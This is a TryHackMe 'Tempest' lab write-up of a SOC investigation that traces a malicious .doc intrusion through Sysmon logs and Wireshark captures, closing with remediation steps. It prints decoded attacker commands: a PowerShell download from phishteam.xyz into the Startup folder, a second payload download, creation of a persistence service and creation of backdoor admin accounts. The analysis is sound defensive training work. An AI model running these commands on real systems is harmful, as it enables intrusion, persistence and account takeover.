# 🔍 TryHackMe — Tempest | SOC Investigation Writeup

> **Platform**: TryHackMe<br>
> **Room**: Tempest<br>
> **Focus**: Sysmon and Network log analysis

---

## 🎯 Scenario

**Tempest Incident**

In this incident, I act as an Incident Responder following an 
alert triaged by a SOC analyst. The alert was confirmed as 
**CRITICAL severity** and requires further investigation.

According to the analyst, the intrusion started from a malicious 
document. Key information from the alert:

- The malicious document has a `.doc` extension
- The user downloaded the malicious document via `chrome.exe`
- The malicious document executed a chain of commands to achieve 
  code execution

---

## 🔎 Initial Overview

In this TryHackMe room, the platform guides us step by step 
through the investigation. Each question and answer progressively 
builds our understanding of the incident.

---

## 🚪 Initial Access — Malicious Document 

The alert gives us a few pieces of information: the malicious 
`.doc` file and the chain of commands executed by that document.

I need to find the file and its associated PID to start my 
investigation. Before going through every log, I need to convert 
the `sysmon.evtx` into a CSV file using **EvtxECmd**, then 
analyze it with **Timeline Explorer**.

<img width="700" alt="EvtxECmd conversion" src="https://github.com/user-attachments/assets/8214c268-b7bf-4038-92e2-7a2469965ba8" />

The room gives us some clues to start the investigation: 
**"Follow the child processes of WinWord.exe"**. By tracking 
WinWord.exe, we discover the malicious `.doc`, its PID, and the 
username.

WinWord.exe is the **parent process** of `free_magicules.doc` — 
that's how I identify the malicious document. I can also filter 
with **Event ID 11 (File Create)** for correlation.

<img width="800" alt="Process creation" src="https://github.com/user-attachments/assets/fb4655c8-9386-4573-b591-c50c65a90f65" />

<img width="700" alt="File create event" src="https://github.com/user-attachments/assets/a3f3c00f-5750-4f6c-9d44-36f90cf51cbf" />

I need to continue the investigation and understand how the 
attacker downloaded `free_magicules.doc`. My plan is to filter 
with **Event ID 22 (DNS query)** and PID 496.

<img width="600" alt="DNS query" src="https://github.com/user-attachments/assets/963ecc34-934c-47ea-9ea8-92ef3feb35e5" />

I got the IP. Now I continue the investigation with PID 496 as 
ParentProcessId to find what happened next  and I discovered 
the payload.

<img width="750" alt="Payload discovery" src="https://github.com/user-attachments/assets/588c8dcf-facc-4f11-86f9-50cfbc91a01b" />

I used **CyberChef** to decode the Base64 payload.

<img width="700" alt="CyberChef Base64 decode" src="https://github.com/user-attachments/assets/e7b11011-33f7-4280-8a49-1b74c4f41012" />

With all of this information, I can answer every question in the 
first part of the investigation.

<img width="700" alt="First part answers" src="https://github.com/user-attachments/assets/95d740f3-ebd9-4e14-beee-7eac1ea5fdc7" />

---

### 🔬 Payload Analysis

Let's continue through the initial access phase. It's interesting 
to work around the payload, after decoding it, we understand 
exactly what the attacker wants to achieve.

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; 
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; 
Expand-Archive .\update.zip -DestinationPath .; 
rm update.zip;
```

**Breakdown of the payload:**

1. **Get AppData path** → resolves the user's AppData folder 
2. **Navigate to Startup folder** → `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
3. **Download payload** → `iwr` (Invoke-WebRequest) fetches `update.zip` from `phishteam.xyz`
4. **Extract archive** → unzips directly into the Startup folder
5. **Clean up** → deletes the ZIP to reduce forensic traces

> 💡 This is a classic **Startup folder persistence** technique (MITRE ATT&CK T1547.001).
----
### 🚪 Initial Access — Stage 2 Execution

For this part of Tempest, I need to check different events: 
**Event ID 1 (Process Creation)** and **Event ID 11 (File Creation)**.

The room gives us a clue: **"check the child processes of 
explorer.exe"**. This makes sense because the payload from the 
previous stage dropped files in the Startup folder, and 
`explorer.exe` is the Windows process that launches them at user 
login.


C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


When I filter the logs with `explorer.exe` as the parent process 
and Event ID 1, I find this:

<img width="1500" alt="explorer.exe child processes" src="https://github.com/user-attachments/assets/0743dce2-01a4-4185-bb37-0def3ec06143" />

The attacker downloads `first.exe` using a PowerShell command, 
leveraging the **`certutil` LOLBin**.

To identify the C2 server, I now look at the DNS requests made 
by the `first.exe` process (Event ID 22):

<img width="400" alt="first.exe DNS queries" src="https://github.com/user-attachments/assets/1f0966b9-b8dd-4736-bcf6-87d1cf9fa110" />


Again with all of this information i can answer every question of that stage 2.


<img width="700"  alt="Capture d&#39;écran 2026-06-07 181436" src="https://github.com/user-attachments/assets/3b2a79ab-6ee3-4394-92dd-eb36b68f254f" />

-----



### 🚪 Initial Access — Malicious Document Traffic 

In this section, the room wants us to analyze the packet capture 
with **Wireshark**. Through network analysis, we can identify 
many interesting elements: every command executed by the attacker, 
how he connected to the C2 server, the user agent used, and more.

Let's filter on the hostname `resolvecyber[.]xyz` found 
previously. We also need to investigate `phishteam[.]xyz`, the 
server from which the attacker downloaded the payload.

<img width="700" alt="phishteam.xyz traffic" src="https://github.com/user-attachments/assets/cb0b5c6f-a5cf-43a6-a6c4-05470a7c9100" />

<img width="700" alt="resolvecyber.xyz traffic" src="https://github.com/user-attachments/assets/145e32b9-66e7-44b3-9dc8-d927f9efa7ff" />

With this information, we can answer several questions and 
understand how the attacker executed his commands. **Every 
command is encoded in Base64** ( we can easily decode them with 
**CyberChef** or similar tools).

The attacker connects to the C2 server at the URI `/9ab62b5` to 
issue commands and execute them. Using HTTP method get and use the parameter q in the url to executed the command like in the first screenshot. 

<img width="650"  alt="Capture d&#39;écran 2026-06-07 182700" src="https://github.com/user-attachments/assets/4c6418d6-fecd-439d-a8e6-2404df384191" />


### Discovery - Internal Reconnaissance 

Let's continue the investigation. Based on the scenario, the 
malicious binary continuously uses the C2 channel for communication. 
We need to discover what sensitive data the attacker accessed and 
what commands he executed.

First, I need to decode every Base64 string in Wireshark but 
copy-pasting every line into CyberChef would take far too much 
time. Instead, I use the **Tshark CLI** to automate the decoding.

```powershell
& "C:\Program Files\Wireshark\tshark.exe" -r "capture.pcapng" 
  -Y "http.request" -T fields -e http.request.uri | ForEach-Object {
    $q = ($_ -split 'q=', 2)[1]
    if ($q) {
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($q))
        "`n========================`n"
    }
}
```


<img width="700" height="264" alt="Capture d&#39;écran 2026-06-08 144145" src="https://github.com/user-attachments/assets/d8cb7795-5f9c-4443-a292-681b4575dd91" />

Now I can read every command the attacker executed. Here's a 
quick recap of the full attack chain:

**PHASE 1 — Reconnaissance** (as `benimaru`)
```
whoami                  → tempest\benimaru
pwd                     → C:\Windows\system32
dir C:\Users            → lists all users
net users               → lists all accounts
net localgroup admins   → Administrator + rimuru
net user benimaru       → details of the benimaru account
dir Desktop             → finds automation.ps1
cat automation.ps1      → 🎯 FOUND CLEAR-TEXT PASSWORD
netstat -ano            → checks active connections
```


**PHASE 2 — Initial Privilege Gain**
```
Critical discovery in automation.ps1:
$user = "TEMPEST\benimaru"
$pass = "infernotempest"        ← CREDENTIAL EXPOSED!
```

**PHASE 3 — Download Stage 2 Payload**
```
powershell iwr http://phishteam.xyz/02dcf07/ch.exe 
           -outfile C:\Users\benimaru\Downloads\ch.exe

→ ch.exe (8.2 MB) = likely chisel.exe for tunneling
→ or a privilege escalation payload
```


**PHASE 4 — Privilege Escalation Successful** 🚨
```
whoami        → nt authority\system   (SYSTEM PRIVILEGES)
whoami /priv  → all SYSTEM privileges listed

→ The attacker successfully escalated to ROOT
```

**PHASE 5 — Password Change (Sabotage)**
```
net user Administrator ch4ng3dpassword!

→ Changes the admin password to prevent losing control
```


**PHASE 6 — Failed Attempts**
```
net user shuna princess         → fail (does not exist)
net user shion m4st3rch3f!      → fail (does not exist)

→ The attacker tries to modify users that do not exist yet
```


**PHASE 7 — Persistence via Service** 🚨
```
sc.exe create TempestUpdate                            → fail (already exists)
sc.exe create TempestUpdate2 
       binpath= C:\ProgramData\final.exe 
       start= auto                                     → SUCCESS

→ Auto-start at boot, runs as LocalSystem
→ MITRE T1543.003 (Windows Service Persistence)
```


**PHASE 8 — Backdoor Account Creation** 🚨
```
net user /add shuna princess                → SUCCESS
net user /add shion m4st3rch3f!             → SUCCESS
net localgroup administrators /add shion    → SUCCESS

→ shion is added to ADMINISTRATORS = admin backdoor created
```

Also i need to check with sysmon the file ch.exe and use the hash value with a tools like VirusTotal to gain more information.

<img width="700"  alt="Capture d&#39;écran 2026-06-08 144117" src="https://github.com/user-attachments/assets/a82e0105-8e92-4b46-a325-d184fffbe15e" />

<img width="700" alt="Capture d&#39;écran 2026-06-08 144246" src="https://github.com/user-attachments/assets/0fe61b34-51e0-4e8a-85f0-2a1e7dc4670a" />



I have everything i need to answer question : 

<img width="700"  alt="Capture d&#39;écran 2026-06-08 145203" src="https://github.com/user-attachments/assets/6b7f2cb0-d4da-4ae1-b079-284f81d34f01" />



### Privilege Escalation - Exploting Privileges

Through my analysis of the decoded commands, I already know a lot 
about how the attacker gained higher privileges. I also identified 
a second C2 connection involving the file `final.exe`.

I know the attacker downloaded another binary for escalation. 
Using a quick Wireshark filter, I assume he uses the same IP 
address  and I find the file that allowed him to gain root 
privileges.

<img width="700"  alt="Capture d&#39;écran 2026-06-08 151325" src="https://github.com/user-attachments/assets/e3569eeb-a0ee-4c87-baa8-0bc1ee2fe0aa" />

I then get the SHA-256 hash via Sysmon (Event ID 1, filtered by 
file name) to look up the binary on **VirusTotal**. The result 
identifies the malware as **PrintSpoofer**  a tool that abuses 
the `SeImpersonatePrivilege` to gain SYSTEM-level privilege 
escalation.


The last file I need to investigate is `final.exe`, which sets up 
another C2 connection. I find the second C2 information because 
earlier in my investigation of the destination IP, I noticed 
another communication on **port 8080**.. 

<img width="700"  alt="Capture d&#39;écran 2026-06-08 152933" src="https://github.com/user-attachments/assets/b975a6dc-96b7-426c-b166-1a47d2a13629" />

Again the answer is : 


<img width="700"  alt="Capture d&#39;écran 2026-06-08 153119" src="https://github.com/user-attachments/assets/0f826761-9e90-4803-bdc2-916644ff6c9e" />

 
### Actions on objective - Fully-owned Machine. 


The last part of the room is straightforward because I have already 
decoded all the Base64 commands and know exactly what the attacker 
did: account creation, adding users to high-privilege groups, etc. 
I just need to read through the commands to answer the remaining 
questions.


<img width="700"  alt="Capture d&#39;écran 2026-06-08 153921" src="https://github.com/user-attachments/assets/40cf47c4-d5d7-44b7-b9d5-0ee0950552a2" />


-------
### What i learn  ?

This investigation provided a fantastic opportunity to work on a realistic incident response scenario. It was a true challenge that allowed me to apply the months of theory I have accumulated into a practical environment.

The most valuable lesson from this room was learning how to effectively correlate network traffic in Wireshark with endpoint logs in Sysmon, the combination of both tools is absolutely critical for a SOC analyst. 


Through this deep-dive analysis, I successfully mapped out the 
entire attack lifecycle:
- Initial access via a malicious document
- C2 reverse-shell establishment
- Credential theft (plaintext credentials in a script)
- Privilege escalation via PrintSpoofer
- Persistence via a fake Windows service
- Backdoor account creation

From a remediation standpoint, the most vital first steps are:
- Immediately blocking the C2 IP addresses at the firewall level
- Disabling the rogue `TempestUpdate2` service
- Purging the unauthorized backdoor accounts (`shion`, `shuna`)
- Resetting the Administrator password
- Removing PrintSpoofer and any persistence mechanisms

---

## 📫 Connect

- 🎓 **TryHackMe**: https://tryhackme.com/p/LilTyki
- 💼 **LinkedIn**: https://www.linkedin.com/in/yann-danhier/













